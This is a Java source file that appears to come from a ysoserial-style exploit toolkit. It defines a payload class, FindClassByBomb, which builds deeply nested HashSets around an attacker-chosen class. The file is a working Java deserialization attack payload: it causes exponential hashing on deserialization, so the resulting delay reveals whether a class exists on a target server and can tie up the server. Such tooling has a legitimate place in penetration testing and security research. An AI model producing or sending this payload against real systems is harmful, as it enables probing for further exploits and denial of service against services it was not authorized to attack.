package me.gv7.woodpecker.yso.payloads;

import me.gv7.woodpecker.yso.payloads.annotation.Authors;
import me.gv7.woodpecker.yso.payloads.util.ClassUtil;
import me.gv7.woodpecker.yso.payloads.util.PayloadRunner;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.*;

@SuppressWarnings ( {
    "restriction"
} )
@Authors({ Authors.C0NY1 })
public class FindClassByBomb extends PayloadRunner implements ObjectPayload<Object> {

    public Object getObject ( final String command ) throws Exception {
        int depth;
        String className = null;

        if(command.contains("|")){
            String[] x = command.split("\\|");
            className = x[0];
            depth = Integer.valueOf(x[1]);
        }else{
            className = command;
            depth = 28;
        }

        Class findClazz = ClassUtil.genClass(className);
        Set<Object> root = new HashSet<Object>();
        Set<Object> s1 = root;
        Set<Object> s2 = new HashSet<Object>();
        for (int i = 0; i < depth; i++) {
            Set<Object> t1 = new HashSet<Object>();
            Set<Object> t2 = new HashSet<Object>();
            t1.add(findClazz);

            s1.add(t1);
            s1.add(t2);

            s2.add(t1);
            s2.add(t2);
            s1 = t1;
            s2 = t2;
        }
        return root;
    }

    public static void main(final String[] args) throws Exception {
        DateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        System.out.println(String.format("Start in %s",df.format(new Date())));
        PayloadRunner.run(FindClassByBomb.class, args);
        System.out.println(String.format("End in %s",df.format(new Date())));
    }
}
